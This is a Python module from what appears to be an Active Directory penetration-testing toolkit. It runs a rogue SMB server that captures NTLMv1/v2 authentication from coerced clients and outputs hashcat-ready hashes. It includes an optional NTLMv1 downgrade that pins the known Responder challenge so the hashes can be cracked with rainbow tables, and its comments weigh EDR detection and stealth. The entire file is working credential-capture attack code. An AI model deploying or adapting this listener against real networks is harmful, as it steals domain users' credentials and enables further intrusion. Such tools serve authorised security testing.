"""Async SMB2 server that captures NTLMv1/v2 hashes without a relay target.

Used by any ADscan flow that needs to listen on port 445 and capture the NTLM
authentication from an incoming connection (e.g. active coercion, hash-grabbing
from triggered credentials) without relaying to a downstream target.

Architecture
------------
``SMBRelayServer`` (aiosmb) accepts connections and calls
``gssapi.authenticate_relay_server()`` on the per-connection GSSAPI object.
``_SPNEGOCaptureAdapter`` wraps asyauth's standalone ``SPNEGOserver`` +
``NTLMServerNative`` so the server generates its own NTLM challenge and
completes the full Negotiate → Challenge → Authenticate handshake locally.
Once the Authenticate message arrives, the completed GSSAPI context is put
into ``capture_queue`` and ``extract_ntlm_hash`` turns it into a
``NtlmCaptureResult``.

Comparison with ``SMBKrbCaptureListener`` (smb_krb_capture.py)
---------------------------------------------------------------
Both modules expose the same async ``start() / stop()`` interface and accept
an ``asyncio.Queue``.  The Kerberos listener uses the bare ``SMBServer`` (no
relay machinery) and captures a raw SPNEGO blob; this module uses
``SMBRelayServer`` and captures a hashcat-format NTLM hash.

Usage
-----
::

    from adscan_internal.services.relay.smb_ntlm_capture import (
        SMBNtlmCaptureConfig,
        SMBNtlmCaptureSource,
        NtlmCaptureResult,
        extract_ntlm_hash,
    )

    queue: asyncio.Queue[object] = asyncio.Queue()
    config = SMBNtlmCaptureConfig(listen_host="192.168.1.5", listen_port=445)
    source = SMBNtlmCaptureSource(config, queue)
    await source.start()
    try:
        gssapi = await asyncio.wait_for(queue.get(), timeout=60.0)
        result = extract_ntlm_hash(gssapi)
        if result:
            print(result.fullhash)   # hashcat-ready string
    finally:
        await source.stop()
"""

from __future__ import annotations

import asyncio
import contextlib
import threading
from dataclasses import dataclass, field
from typing import Any

from adscan_core import telemetry
from adscan_internal.rich_output import print_info_debug


# ---------------------------------------------------------------------------
# Public result type
# ---------------------------------------------------------------------------

@dataclass(frozen=True)
class NtlmCaptureResult:
    """An NTLM credential captured from a completed SMB SESSION_SETUP exchange."""

    fullhash: str
    ntlm_version: str   # "NTLMv1" or "NTLMv2"
    username: str | None
    domain: str | None


# ---------------------------------------------------------------------------
# Inbound-connection observability
# ---------------------------------------------------------------------------
#
# The capture queue only records *completed* NTLM authentications. That makes
# a "no capture" result ambiguous: it cannot tell "the target never reached our
# listener" (a reachability artifact) apart from "the target reached us but did
# not NTLM-auth" (a real auth-type signal). ``InboundConnectionObserver``
# records every inbound TCP connection during the capture window - count,
# distinct source IPs, and the furthest NTLM handshake stage each connection
# reached - so the no-capture verdict can state which of the two it was.


@dataclass(frozen=True)
class InboundConnectionStats:
    """Immutable snapshot of inbound activity during a capture window.

    ``handshake_stages`` maps the furthest stage label
    (``"connected"`` / ``"negotiate"`` / ``"challenge"`` / ``"authenticate"``)
    to the number of connections that reached it. ``ntlm_seen`` is True if any
    inbound connection advanced to at least the NTLM Negotiate stage.
    """

    total_connections: int = 0
    source_ips: tuple[str, ...] = ()
    handshake_stages: dict[str, int] = field(default_factory=dict)
    ntlm_seen: bool = False


# Stage ordering - used to keep only the *furthest* stage a connection reached.
_STAGE_ORDER: dict[str, int] = {
    "connected": 0,
    "negotiate": 1,
    "challenge": 2,
    "authenticate": 3,
}


class InboundConnectionObserver:
    """Thread-safe tally of inbound connections seen by the capture listener.

    A single observer instance is shared across every per-connection
    ``_SPNEGOCaptureAdapter``. The adapter calls :meth:`record_connection` when
    the transport hands it a connection and :meth:`record_stage` as the SPNEGO
    handshake advances. The listener runs on its own event loop in a background
    thread, so all mutation is guarded by a lock.
    """

    def __init__(self) -> None:
        self._lock = threading.Lock()
        self._connection_ids: set[int] = set()
        self._source_ips: list[str] = []
        self._stage_by_connection: dict[int, str] = {}

    def record_connection(self, connection: Any) -> None:
        """Record a new inbound connection and its source IP, if available."""
        conn_id = id(connection)
        source_ip = _extract_peer_ip(connection)
        with self._lock:
            if conn_id not in self._connection_ids:
                self._connection_ids.add(conn_id)
                self._stage_by_connection[conn_id] = "connected"
            if source_ip and source_ip not in self._source_ips:
                self._source_ips.append(source_ip)

    def record_stage(self, connection: Any, stage: str) -> None:
        """Record the furthest SPNEGO/NTLM handshake stage for a connection."""
        if stage not in _STAGE_ORDER:
            return
        conn_id = id(connection)
        with self._lock:
            self._connection_ids.add(conn_id)
            current = self._stage_by_connection.get(conn_id, "connected")
            if _STAGE_ORDER[stage] > _STAGE_ORDER.get(current, -1):
                self._stage_by_connection[conn_id] = stage

    def snapshot(self) -> InboundConnectionStats:
        """Return an immutable snapshot of the observed inbound activity."""
        with self._lock:
            stage_counts: dict[str, int] = {}
            for stage in self._stage_by_connection.values():
                stage_counts[stage] = stage_counts.get(stage, 0) + 1
            ntlm_seen = any(
                _STAGE_ORDER.get(stage, -1) >= _STAGE_ORDER["negotiate"]
                for stage in self._stage_by_connection.values()
            )
            return InboundConnectionStats(
                total_connections=len(self._connection_ids),
                source_ips=tuple(self._source_ips),
                handshake_stages=dict(stage_counts),
                ntlm_seen=ntlm_seen,
            )


def _extract_peer_ip(connection: Any) -> str | None:
    """Best-effort extraction of the peer IP from a UniConnection-like object."""
    getter = getattr(connection, "get_extra_info", None)
    if callable(getter):
        try:
            peername = getter("peername")
        except Exception:  # noqa: BLE001 - never let observability break capture
            peername = None
        if isinstance(peername, (tuple, list)) and peername:
            return str(peername[0])
        if isinstance(peername, str) and peername:
            return peername
    peer_ip = getattr(connection, "peer_ip", None)
    if peer_ip:
        return str(peer_ip)
    return None


# ---------------------------------------------------------------------------
# GSSAPI adapter — bridges relay server API to standalone SPNEGOserver
# ---------------------------------------------------------------------------

class _SPNEGOCaptureAdapter:
    """Wraps asyauth ``SPNEGOserver`` to expose the ``SMBRelayServer`` GSSAPI API.

    ``SMBRelayServer`` calls ``authenticate_relay_server()`` on each per-connection
    GSSAPI object.  The standalone ``SPNEGOserver`` only exposes
    ``authenticate_server()``.  This adapter delegates and puts the completed
    GSSAPI context into ``_capture_queue`` once ``to_continue`` is ``False``.
    """

    def __init__(
        self,
        capture_queue: asyncio.Queue[object],
        inner: object,
        observer: InboundConnectionObserver | None = None,
    ) -> None:
        self._inner = inner
        self._capture_queue = capture_queue
        self._observer = observer
        self._connection: Any = None
        # Each call to ``authenticate_relay_server`` advances the SPNEGO/NTLM
        # handshake one round. Track the round so we can label the stage the
        # connection reached (negotiate -> challenge -> authenticate) even when
        # the auth never completes (Kerberos client, abort, refusal).
        self._round = 0

    def set_connection_info(self, connection: Any) -> None:
        self._connection = connection
        if self._observer is not None:
            self._observer.record_connection(connection)
        self._inner.set_connection_info(connection)

    def get_mechtypes_list(self) -> bytes:
        return self._inner.get_mechtypes_list()

    async def authenticate_relay_server(
        self,
        token: bytes,
        *args: object,
        **kwargs: object,
    ) -> tuple[bytes | None, bool, Exception | None]:
        # Defense in depth: the capture for a *completed* auth has already
        # landed in the queue by the time the handshake ends, so a parse or
        # handshake failure on a later/other connection (e.g. a modern client
        # sending an SMB2 negotiate context aiosmb cannot body-parse, or a
        # malformed/aborted handshake) must never spam the operator's terminal
        # with a raw traceback. Catch anything here at the listener boundary,
        # DEBUG-demote it via print_info_debug + telemetry, and return it to the
        # relay server as a normal auth error (None, False, err) so the server
        # cleanly closes that connection and keeps listening.
        try:
            self._round += 1
            if self._observer is not None:
                # Round 1 carries the NTLM Negotiate token; round 2 is the client
                # Authenticate. The server emits its Challenge between the two.
                stage = "negotiate" if self._round == 1 else "authenticate"
                self._observer.record_stage(self._connection, stage)
            result, to_continue, err = await self._inner.authenticate_server(
                token, *args, **kwargs
            )
            if self._observer is not None and to_continue and err is None:
                # We produced a Challenge and are waiting for the Authenticate.
                self._observer.record_stage(self._connection, "challenge")
            if not to_continue and err is None:
                await self._capture_queue.put(self._inner)
            return result, to_continue, err
        except asyncio.CancelledError:
            raise
        except Exception as exc:  # noqa: BLE001 - a single bad connection must not crash the listener
            telemetry.capture_exception(exc)
            print_info_debug(
                f"[smb-ntlm-capture] handshake/parse error on inbound "
                f"connection (ignored, listener continues): {exc}"
            )
            return None, False, exc

    async def authenticate_relay_server_finished(self) -> tuple[bytes, None]:
        return await self._inner.authenticate_server_finished()

    def get_session_key(self) -> bytes:
        return self._inner.get_session_key()


# ---------------------------------------------------------------------------
# Hash extraction
# ---------------------------------------------------------------------------

def extract_ntlm_hash(gssapi: object) -> NtlmCaptureResult | None:
    """Extract a hashcat-format NTLM hash from a completed ``SPNEGOserver`` context.

    Returns ``None`` if the exchange is not yet complete or cannot be parsed.
    """
    ntlm = None
    if hasattr(gssapi, "get_ntlm"):
        ntlm = gssapi.get_ntlm()
    if ntlm is None and hasattr(gssapi, "selected_authentication_context_server"):
        ntlm = gssapi.selected_authentication_context_server

    negotiate = getattr(ntlm, "ntlmNegotiate", None)
    challenge = getattr(ntlm, "ntlmChallenge", None)
    authenticate = getattr(ntlm, "ntlmAuthenticate", None)

    if negotiate is None or challenge is None or authenticate is None:
        return None

    try:
        from badauth.protocols.ntlm.creds_calc import NTLMCredentials  # noqa: PLC0415

        creds_list = NTLMCredentials.construct(negotiate, challenge, authenticate)
    except Exception:  # noqa: BLE001
        return None

    if not creds_list:
        return None

    # A single authenticate can yield multiple credential encodings. A downgraded
    # NetNTLMv1 comes back as ``[netLM, netNTLMv1]`` (LM first), and the LM-only
    # forms (netLM / netLMv2) are not hashcat-crackable — so picking ``[0]`` would
    # drop the crackable hash. Prefer the NT-based response, most-crackable first.
    _CTYPE_RANK = {"netntlmv2": 0, "netntlmv1": 1, "netntlmv1-ess": 2}

    def _rank(candidate: object) -> int:
        return _CTYPE_RANK.get(str(getattr(candidate, "ctype", "") or "").lower(), 99)

    cred = min(creds_list, key=_rank)
    if _rank(cred) == 99:
        # Only LM-only encodings were captured — nothing hashcat can crack.
        return None
    ctype = str(getattr(cred, "ctype", "") or "").lower()
    version = "NTLMv2" if "v2" in ctype else "NTLMv1"

    fullhash = getattr(cred, "fullhash", None)
    if not fullhash:
        return None

    return NtlmCaptureResult(
        fullhash=fullhash,
        ntlm_version=version,
        username=getattr(cred, "username", None),
        domain=getattr(cred, "domain", None),
    )


# ---------------------------------------------------------------------------
# Listener
# ---------------------------------------------------------------------------

@dataclass(frozen=True)
class SMBNtlmCaptureConfig:
    """Configuration for the standalone NTLM capture SMB listener."""

    listen_host: str = "0.0.0.0"
    listen_port: int = 445
    # NTLMv1 downgrade-capture (Responder --disable-ess parity). When True the
    # server clears Extended Session Security and pins the challenge so a
    # v1-capable client returns a crack.sh-rainbow-crackable plain NetNTLMv1.
    # Default OFF: ordinary capture keeps ESS + a random challenge (modern
    # clients still return NetNTLMv2). Only opt in against a KNOWN v1-capable
    # host and outside max-stealth posture — the pinned challenge is the
    # Responder IOC (MDI/EDR alert on 1122334455667788).
    force_ntlm_downgrade: bool = False
    challenge: bytes | None = None


class SMBNtlmCaptureSource:
    """Async SMB2 server that captures NTLMv1/v2 hashes without a relay target.

    Mirrors the ``SMBKrbCaptureListener`` interface: async ``start()`` /
    ``stop()`` with a caller-supplied ``asyncio.Queue``.

    Usage::

        queue: asyncio.Queue[object] = asyncio.Queue()
        source = SMBNtlmCaptureSource(
            SMBNtlmCaptureConfig(listen_host="192.168.1.5"),
            queue,
        )
        await source.start()
        try:
            gssapi = await asyncio.wait_for(queue.get(), timeout=60.0)
            result = extract_ntlm_hash(gssapi)
        finally:
            await source.stop()
    """

    def __init__(
        self,
        config: SMBNtlmCaptureConfig,
        capture_queue: asyncio.Queue[object],
    ) -> None:
        self._config = config
        self._capture_queue = capture_queue
        self._server_task: asyncio.Task[object] | None = None
        self._server: object = None
        self._observer = InboundConnectionObserver()

    @property
    def connection_stats(self) -> InboundConnectionStats:
        """Return the inbound-connection tally observed so far.

        Lets a caller distinguish "0 inbound connections - the target never
        reached us" (reachability artifact) from ">0 inbound, no NTLM" (a real
        auth-type / refusal signal) when no hash was captured.
        """
        return self._observer.snapshot()

    async def start(self) -> None:
        """Start the SMB capture listener.  Raises on bind failure."""
        from badauth.protocols.ntlm.server.native import NTLMServerNative  # noqa: PLC0415
        from badauth.protocols.spnego.server.native import SPNEGOserver  # noqa: PLC0415
        from badauth.common.credentials.ntlm import NTLMCredential  # noqa: PLC0415
        from badauth.common.constants import asyauthSecret  # noqa: PLC0415
        from asysocks.unicomm.common.target import UniProto, UniTarget  # noqa: PLC0415
        from aiosmb.protocol.smb2.commands.negotiate import NegotiateDialects  # noqa: PLC0415
        from aiosmb.relay.server import SMBRelayServer, SMBServerSettings  # noqa: PLC0415
        from aiosmb.wintypes.dtyp.constrcuted_security.guid import GUID  # noqa: PLC0415

        capture_queue = self._capture_queue
        observer = self._observer
        config = self._config

        def _make_gssapi() -> _SPNEGOCaptureAdapter:
            cred = NTLMCredential(
                secret="",
                username="",
                domain="",
                stype=asyauthSecret.PASSWORD,
            )
            # NTLMv1 downgrade knobs (read by NTLMServerNative via getattr /
            # credential.challenge). Default OFF leaves the credential untouched,
            # so ordinary capture is byte-identical (random challenge + ESS on).
            if config.force_ntlm_downgrade:
                cred.force_ntlm_downgrade = True
                cred.challenge = (
                    config.challenge
                    if config.challenge is not None
                    else bytes.fromhex("1122334455667788")
                )
            elif config.challenge is not None:
                cred.challenge = config.challenge
            ntlm_server = NTLMServerNative(cred)
            inner = SPNEGOserver(capture_queue)
            inner.add_auth_context(
                "NTLMSSP - Microsoft NTLM Security Support Provider", ntlm_server
            )
            return _SPNEGOCaptureAdapter(capture_queue, inner, observer)

        target = UniTarget(
            self._config.listen_host, self._config.listen_port, UniProto.SERVER_TCP
        )
        from adscan_internal.services.native_log_taming import make_relay_log_callback  # noqa: PLC0415
        settings = SMBServerSettings(_make_gssapi, log_callback=make_relay_log_callback("smb-ntlm-capture"))  # pylint: disable=unexpected-keyword-arg
        settings.preferred_dialects = [NegotiateDialects.SMB202]
        settings.ServerGuid = GUID.random()
        settings.RequireSigning = False
        settings.shares = {}

        self._server = SMBRelayServer(target, settings)
        task, err = await self._server.run()
        if err is not None:
            raise RuntimeError(
                f"SMB NTLM capture listener failed to start on "
                f"{self._config.listen_host}:{self._config.listen_port}: {err}"
            )
        self._server_task = task
        print_info_debug(
            f"[smb-ntlm-capture] listener ready — "
            f"{self._config.listen_host}:{self._config.listen_port}"
        )

    async def stop(self) -> None:
        """Stop the SMB capture listener."""
        if self._server_task is not None:
            self._server_task.cancel()
            with contextlib.suppress(asyncio.CancelledError, Exception):
                await self._server_task
            self._server_task = None
